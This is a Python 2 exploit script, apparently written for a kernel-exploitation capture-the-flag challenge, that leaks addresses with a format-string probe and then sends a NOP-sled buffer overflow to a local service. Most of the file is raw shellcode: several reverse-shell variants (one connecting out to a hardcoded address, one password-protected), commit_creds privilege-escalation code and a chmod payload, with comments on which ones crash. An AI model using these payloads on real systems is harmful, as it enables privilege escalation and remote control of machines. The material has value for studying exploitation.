#! /usr/bin/env python2
import socket
import struct
from pwn import p64,p32
offset=1024
port=9999




padding="B"*(1100-offset-4)
#payload="A"*(offset-200-len(buf))+"\x90"*200+buf+eip+padding 
payload1="HOLA"
payload1+="%p"*6

# revshell crashes kernel
buf=b""
buf+=b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
buf+=b"\x5e\x48\x31\xd2\x0f\x05\x48\x97"
buf+=b"\x6a\x02\x66\xc7\x44\x24\x02\x11"
buf+=b"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"
buf+=b"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"
buf+=b"\x58\x48\xff\xce\x0f\x05\xe0\xf6"
buf+=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62"
buf+=b"\x69\x6e\x2f\x2f\x73\x68\x57\x54"
buf+=b"\x5f\xb0\x3b\x99\x0f\x05"

# revshell previously executed doesn't work

buf=b""
buf+=b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02\x7a\x69\xc7\x44\x24\x04\xac\x1c\xfc\x90\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05"


# revshell with auth crashes kernel
buf=b""
buf+=b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
buf+=b"\x5e\x99\x0f\x05\x48\x97\x52\x48"
buf+=b"\xbb\xfd\xff\xee\xa3\x80\xff\xff"
buf+=b"\xfe\x48\xf7\xd3\x53\x54\x5e\xb0"
buf+=b"\x2a\xb2\x10\x0f\x05\x6a\x03\x5e"
buf+=b"\xb0\x21\xff\xce\x0f\x05\xe0\xf8"
buf+=b"\x48\x31\xff\x50\x54\x5e\xb2\x08"
buf+=b"\x0f\x05\x48\x91\x48\xbb\x31\x32"
buf+=b"\x33\x34\x35\x36\x37\x0a\x53\x54"
buf+=b"\x5f\xf3\xa6\x75\x1a\x6a\x3b\x58"
buf+=b"\x99\x52\x48\xbb\x2f\x2f\x62\x69"
buf+=b"\x6e\x2f\x73\x68\x53\x54\x5f\x52"
buf+=b"\x54\x5a\x57\x54\x5e\x0f\x05\x90"


# xor rax rax;xor rbx rbx; leave;
buf=b""
buf+=b"\x48\x31\xff\x48\xc7\xc1\x90\x25\x0a\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x60\x22\x0a\x81\xff\xd1\x49\xbf\x2f\x66\x6c\x61\x67\x00\x00\x00\x49\xc7\xc6\x00\xdf\xea\x0d\x4d\x89\x3e\x48\xbf\x9c\xff\xff\xff\x00\x00\x00\x00\x4c\x89\xf6\x48\xc7\xc2\xff\x01\x00\x00\x48\xc7\xc1\xd0\x4d\x20\x81\xff\xd1\x48\xc7\xc7\x00\x00\x00\x01\x48\xc7\xc1\xd0\xe6\x0e\x81\xff\xd1\xcd\x03"





# commitcreds 
#buf=b""
#buf=b"\x48\x31\xff\x48\xc7\xc1\x90\x25\x0a\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x60\x22\x0a\x81\xff\xd1\xc3"

#buf=b"\x41"*32

#buf=b"\x48\x31\xff\xe8\x68\xc2\x41\xc0\xc3"

"""
try ropgadget to call shellcode  

"""# commit creds +chmod 777 /flag => crashes the program 
buf=b"\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80"


redirect_code=p64(0xffffffffc05f7270)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', port))
s.send(payload1)
print s.recv(1024)

myinput=int(input("Input first hex value in little endian: "))
#test_input=raw_input("hex looking shit")
#print(test_input)
#addr_buf=p32(myinput)+"\x01\x88\xff\xff"
addr_buf=p64(myinput)#"ffff8800153b1db0"
#addr_buf=struct.pack("<",myinput)
#addr_buf ="\x1a\x97\x93\xc6\x99\x55"  #0x5599c693971a
for i in range(len(addr_buf)):
	
	if addr_buf[i]=="\x00":
		print("null byte found !!")
		print("buff[i]",addr_buf[i])
		s.close()
		exit(0)


payload2=b"\x90"*64+buf+b"\x90"*(offset-len(buf)-56)+addr_buf

# ropgadgets 

print(len(payload2))
s.send(payload2)
print(bytes(addr_buf))

s.close()